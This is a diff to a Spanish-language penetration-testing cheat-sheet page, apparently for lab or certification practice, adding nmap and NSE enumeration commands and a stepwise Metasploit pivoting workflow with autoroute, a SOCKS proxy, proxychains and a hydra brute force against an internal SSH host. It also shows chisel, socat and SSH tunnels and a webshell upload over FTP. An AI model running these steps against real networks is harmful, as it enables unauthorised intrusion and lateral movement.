@@ -221,6 +221,15 @@ const D = [
   ["scan","Escaneo UDP de los más comunes","-sU escanea UDP; ve servicios que el escaneo TCP no detecta (SNMP, TFTP, DNS)","sudo nmap -sU --top-ports 100 {IP}"],
   ["scan","Guardar en los tres formatos","-oA genera .nmap, .gnmap y .xml de una vez para procesar la salida luego","nmap -p- -sVC {IP} -oA fullscan"],
   ["scan","Ejecutar scripts NSE de un tipo","lanza los scripts de una categoría (vuln busca vulnerabilidades conocidas)","nmap --script vuln {IP}"],
+  ["scan","Mostrar solo los puertos abiertos","--open limpia la salida ocultando cerrados y filtrados","nmap -p- --open {IP}"],
+  ["scan","Escaneo TCP connect (sin root)","-sT completa el handshake; el que usa proxychains porque -sS no funciona por SOCKS","nmap -sT {IP}"],
+  ["scan","Detectar el sistema operativo","-O intenta identificar el SO por la pila TCP/IP","sudo nmap -O {IP}"],
+  ["scan","Escaneo agresivo todo en uno","-A junta -sV, -sC, -O y traceroute; rápido para una primera foto","nmap -A {IP}"],
+  ["scan","Escanear varios puertos concretos","lista separada por comas cuando ya sabes cuáles te interesan","nmap -p 22,80,443,445,3306 {IP}"],
+  ["scan","TCP y UDP en la misma orden","T: para puertos TCP y U: para UDP en una sola pasada","sudo nmap -p T:80,U:53 {IP}"],
+  ["scan","Escanear una lista de objetivos","-iL lee las IPs de un fichero (una por línea)","nmap -iL objetivos.txt -oN barrido"],
+  ["scan","Por qué un puerto está en ese estado","--reason explica si respondió, no respondió o fue filtrado","nmap --reason {IP}"],
+  ["scan","Ver el porqué del escaneo en vivo","-vv da salida muy detallada mientras corre","nmap -p- -vv {IP}"],
 
   // ===== 3. Web =====
   ["web","Escaneo de vulnerabilidades web","Nikto prueba miles de rutas y fallos conocidos (ficheros peligrosos, versiones vulnerables)","nikto -h http://{IP}"],
@@ -232,6 +241,8 @@ const D = [
   ["web","Ver solo las cabeceras HTTP","-I pide únicamente las cabeceras: revela servidor, redirecciones y cookies","curl -sI http://{IP}"],
   ["web","Buscar rutas y comentarios en el HTML","descarga la página y filtra enlaces, recursos y comentarios donde a veces hay pistas","curl -s http://{IP} | grep -iE 'href|src|<!--'"],
   ["web","Seguir redirecciones y ver el cuerpo","-L sigue los 301/302 para ver dónde acaba realmente la petición","curl -sL http://{IP}"],
+  ["web","Enumerar la web con NSE","http-enum busca directorios y ficheros conocidos con los scripts de nmap","nmap -p80 --script http-enum {IP}"],
+  ["web","Sacar el título de la web","http-title confirma rápido qué app corre en cada puerto web","nmap -p80,443 --script http-title {IP}"],
 
   // ===== 4. WordPress =====
   ["wordpress","Enumerar usuarios y plugins vulnerables","--enumerate u lista usuarios, vp lista plugins con vulnerabilidades conocidas","wpscan --url http://{IP} --enumerate u,vp"],
@@ -246,9 +257,12 @@ const D = [
   ["services","Enumeración SMB completa","-a lanza todas las comprobaciones: usuarios, grupos, shares y políticas","enum4linux -a {IP}"],
   ["services","Conectarse a un recurso SMB","abre una sesión al share; dentro se usan 'ls' y 'get fichero' para descargar","smbclient //{IP}/share -N"],
   ["services","Descargar todo un share recursivo","-R con smbget baja la carpeta entera de golpe","smbget -R smb://{IP}/share"],
+  ["services","Detección de SO por SMB (NSE)","smb-os-discovery saca versión de Windows y nombre de equipo por el 445","nmap -p445 --script smb-os-discovery {IP}"],
+  ["services","Listar shares SMB con NSE","alternativa a smbclient usando los scripts de nmap","nmap -p445 --script smb-enum-shares {IP}"],
 
   // ===== 6. FTP =====
   ["ftp","Login anónimo a FTP","muchos FTP permiten usuario 'anonymous' con cualquier contraseña","ftp {IP}"],
+  ["ftp","Comprobar FTP anónimo con NSE","ftp-anon confirma de un vistazo si el 21 acepta acceso anónimo","nmap -p21 --script ftp-anon {IP}"],
   ["ftp","Descargar un fichero por FTP","dentro de la sesión: 'binary' y luego get","get fichero.txt"],
   ["ftp","Descargar todo por FTP (wget)","-r recursivo con credenciales anónimas","wget -r ftp://anonymous:anonymous@{IP}/"],
   ["ftp","Subir un fichero al FTP","útil si el FTP sirve la web (subir webshell)","put shell.php"],
@@ -369,15 +383,31 @@ const D = [
   ["post","Leer los usuarios del sistema","/etc/passwd lista las cuentas; busca las que tienen shell","cat /etc/passwd"],
 
   // ===== 20. Pivoting =====
-  ["pivot","Crear ruta hacia la red interna","autoroute manda por la sesión el tráfico de msf dirigido a esa subred","run autoroute -s 10.10.20.0/24"],
-  ["pivot","Escanear la red interna por la sesión","módulo de portscan que llega a hosts que solo alcanza el pivot","use auxiliary/scanner/portscan/tcp"],
-  ["pivot","Levantar un SOCKS proxy en msf","expone la red interna para herramientas de fuera (vía proxychains)","use auxiliary/server/socks_proxy"],
-  ["pivot","Servidor chisel en tu Kali","--reverse permite que el cliente abra un túnel de vuelta hacia ti","chisel server -p 8000 --reverse"],
-  ["pivot","Cliente chisel en el pivot","R:socks crea un proxy SOCKS inverso que sale por la red interna","chisel client {IP}:8000 R:socks"],
-  ["pivot","Usar el proxy con proxychains","antepone proxychains para que la herramienta salga por el túnel SOCKS","proxychains nmap -sT -Pn 10.10.20.5"],
-  ["pivot","Redirigir un puerto con socat","reenvía tu 8080 al puerto de un host interno inalcanzable directamente","socat TCP-LISTEN:8080,fork TCP:10.10.20.5:80"],
-  ["pivot","Túnel SSH dinámico (SOCKS)","-D abre un proxy SOCKS por la conexión SSH; úsalo con proxychains","ssh -D 1080 usuario@{IP}"],
-  ["pivot","Port forward local por SSH","-L trae un puerto de un host interno a tu localhost","ssh -L 8080:10.10.20.5:80 usuario@{IP}"],
+  // -- Paso 1: identificar la red interna desde la sesión --
+  ["pivot","1 · Ver las redes de la víctima (Meterpreter)","busca una interfaz con IP en otra subred: esa es la red interna a la que pivotar","ipconfig"],
+  ["pivot","1 · Ver las redes (shell Linux)","misma idea desde una shell normal: una segunda interfaz revela el pivot","ifconfig"],
+  // -- Paso 2: crear la ruta con autoroute --
+  ["pivot","2 · Crear la ruta con autoroute","enruta por esta sesión el tráfico de msf hacia la subred interna indicada","run autoroute -s 10.10.10.0/24"],
+  ["pivot","2 · Autoroute con máscara completa","misma ruta escrita con máscara en lugar de CIDR","run autoroute -s 10.10.10.0 255.255.255.0"],
+  ["pivot","2 · Autoroute con el módulo post","alternativa: configuras SESSION con el ID de tu Meterpreter y ejecutas run","use post/multi/manage/autoroute"],
+  // -- Paso 3: verificar la ruta --
+  ["pivot","3 · Verificar las rutas (Meterpreter)","-p imprime la tabla de rutas que msf ha aprendido para confirmar que la ruta existe","run autoroute -p"],
+  ["pivot","3 · Verificar las rutas (msfconsole)","muestra desde la consola las rutas activas del framework","route print"],
+  // -- Paso 4: segundo plano y atacar por la ruta --
+  ["pivot","4 · Mandar la sesión al segundo plano","vuelve a la consola de msf dejando la sesión viva para poder usar la ruta","background"],
+  ["pivot","4 · Escanear la Víctima 2 por la ruta","msf detecta solo que para llegar a esa IP debe usar la ruta de autoroute","use auxiliary/scanner/portscan/tcp"],
+  ["pivot","4 · Fijar el objetivo interno y lanzar","RHOSTS es el host de la red interna; 'run' escanea a través del túnel","set RHOSTS 10.10.10.15"],
+  // -- Paso 5: exponer la red a herramientas externas (nmap, hydra) --
+  ["pivot","5 · SOCKS proxy para herramientas externas","autoroute solo vale dentro de msf; este proxy expone la red a nmap/hydra","use auxiliary/server/socks_proxy"],
+  ["pivot","5 · Configurar proxychains","añade al final del fichero 'socks5 127.0.0.1 1080' (el puerto del socks_proxy)","sudo nano /etc/proxychains4.conf"],
+  ["pivot","5 · Nmap externo por el proxy","proxychains obliga a nmap a salir por el túnel; usa -sT y -Pn sí o sí","proxychains nmap -sT -Pn 10.10.10.15"],
+  ["pivot","5 · Hydra externo por el proxy","cualquier herramienta externa pasa por el túnel anteponiendo proxychains","proxychains hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.15"],
+  // -- Alternativas sin Metasploit --
+  ["pivot","Alt · Servidor chisel en tu Kali","túnel SOCKS sin Metasploit; --reverse deja que el cliente conecte de vuelta","chisel server -p 8000 --reverse"],
+  ["pivot","Alt · Cliente chisel en el pivot","R:socks crea el proxy SOCKS inverso que sale por la red interna","chisel client {IP}:8000 R:socks"],
+  ["pivot","Alt · Redirigir un puerto con socat","reenvía tu 8080 a un puerto de un host interno inalcanzable directo","socat TCP-LISTEN:8080,fork TCP:10.10.10.15:80"],
+  ["pivot","Alt · Túnel SSH dinámico (SOCKS)","-D abre un proxy SOCKS por la conexión SSH; combínalo con proxychains","ssh -D 1080 usuario@{IP}"],
+  ["pivot","Alt · Port forward local por SSH","-L trae un puerto de un host interno directo a tu localhost","ssh -L 8080:10.10.10.15:80 usuario@{IP}"],
 
   // ===== 21. Escalada de privilegios (Linux) =====
   ["privesc","Qué puedo ejecutar como sudo","lista los comandos que el usuario puede correr como root; el vector más rápido","sudo -l"],
@@ -474,7 +504,7 @@ ipEl.addEventListener("input",render);
 const COPY_ICON=`<svg viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>`;
 const CHECK_ICON=`<svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg>`;
 
-const TOOLS=/^(sudo\s+)?(nmap|ffuf|dirb|nikto|whatweb|wpscan|smbclient|smbget|crackmapexec|enum4linux|snmpwalk|searchsploit|hydra|msfconsole|msfvenom|nc|ncat|bash|sh|php|python3?|wget|curl|chisel|socat|proxychains|arp-scan|find|getcap|stty|script|export|grep|cat|id|ip|ss|ftp|dig|dnsenum|mysql|impacket-mssqlclient|xfreerdp|ldapsearch|showmount|mount|smtp-user-enum|hashid|hashcat|john|ssh2john|zip2john|ssh|certutil|powershell|systeminfo|whoami|winpeas|findstr|wmic|docker|uname|for|while|rm|mkfifo|echo|put|get|sqlmap|stegsnow|steghide|strings|exiftool|file|binwalk)\b/;
+const TOOLS=/^(sudo\s+)?(nmap|ffuf|dirb|nikto|whatweb|wpscan|smbclient|smbget|crackmapexec|enum4linux|snmpwalk|searchsploit|hydra|msfconsole|msfvenom|nc|ncat|bash|sh|php|python3?|wget|curl|chisel|socat|proxychains|arp-scan|find|getcap|stty|script|export|grep|cat|id|ip|ss|ftp|dig|dnsenum|mysql|impacket-mssqlclient|xfreerdp|ldapsearch|showmount|mount|smtp-user-enum|hashid|hashcat|john|ssh2john|zip2john|ssh|certutil|powershell|systeminfo|whoami|winpeas|findstr|wmic|docker|uname|for|while|rm|mkfifo|echo|put|get|sqlmap|stegsnow|steghide|strings|exiftool|file|binwalk|ifconfig|ipconfig|route|nano)\b/;
 
 function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}
 function applyIP(cmd){
